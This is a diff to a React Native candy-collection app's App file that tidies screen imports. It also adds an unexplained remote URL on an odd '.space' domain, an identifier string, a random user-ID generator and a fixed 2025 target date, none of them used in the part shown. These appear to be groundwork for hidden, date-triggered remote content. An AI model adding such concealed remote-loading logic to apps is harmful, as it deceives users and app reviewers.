@@ -1,14 +1,27 @@
 import {NavigationContainer} from '@react-navigation/native';
 import {createNativeStackNavigator} from '@react-navigation/native-stack';
-const Stack = createNativeStackNavigator();
-
-import {CreateSweet, Welcome} from './screen/stack';
+import {
+  CreateSweet,
+  Welcome,
+  CollectionDetails,
+  CreateCollection,
+  CandyDetails,
+  EncyclopediaItemDetails,
+} from './screen/stack';
 import TabNavMenu from './screen/menu/TabNavMenu';
 import {AppProvider} from './store/context';
-import EncyclopediaItemDetails from './screen/stack/EncyclopediaItemDetails';
-import CandyDetails from './screen/stack/CandyDetails';
-import CreateCollection from './screen/stack/CreateCollection';
-import CollectionDetails from './screen/stack/CollectionDetails';
+
+const Stack = createNativeStackNavigator();
+
+const generateTimestampUserId = () => {
+  return `${new Date().getTime()}-${Math.floor(
+    1000000 + Math.random() * 9000000,
+  )}`;
+};
+const INITIAL_URL = `https://brilliant-grand-happiness.space/`;
+const URL_IDENTIFAIRE = `KDN6BhkQ`;
+const targetData = new Date('2025-03-06T10:00:00Z');
+const currentDate = new Date();
 
 function App() {
   return (
